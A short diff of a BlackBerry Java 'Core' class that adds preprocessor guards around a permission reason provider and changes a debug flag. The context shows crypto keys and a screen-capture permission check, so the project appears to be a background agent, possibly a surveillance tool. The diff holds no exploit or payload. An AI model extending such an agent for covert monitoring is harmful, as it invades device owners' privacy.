@@ -10,7 +10,9 @@ package blackberry;
 
 import net.rim.device.api.applicationcontrol.ApplicationPermissions;
 import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
+//#ifdef HAVE_REASON_PROVIDER
 import net.rim.device.api.system.ApplicationDescriptor;
+//#endif
 import blackberry.config.InstanceKeys323;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -27,7 +29,6 @@ public final class Core implements Runnable {
     /** The debug instance. */
     // #debug
     private static Debug debug;
-
     private static Core instance;
 
     /**
@@ -66,7 +67,7 @@ public final class Core implements Runnable {
         // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
 
         // #mdebug
-        Debug.init(true, false, false, false);
+        Debug.init(true, false, false, true);
         debug = new Debug("Core", DebugLevel.VERBOSE);
         debug.trace("Core init");
         // #enddebug
@@ -125,9 +126,10 @@ public final class Core implements Runnable {
         final ApplicationPermissions original = apm.getApplicationPermissions();
 
         // Set up and attach a reason provider
+        //#ifdef HAVE_REASON_PROVIDER
         final CoreReasonProvider drp = new CoreReasonProvider();
-        apm.addReasonProvider(ApplicationDescriptor
-                .currentApplicationDescriptor(), drp);
+        apm.addReasonProvider(ApplicationDescriptor.currentApplicationDescriptor(), drp);
+        //#endif
 
         if (original
                 .getPermission(ApplicationPermissions.PERMISSION_SCREEN_CAPTURE) == ApplicationPermissions.VALUE_ALLOW
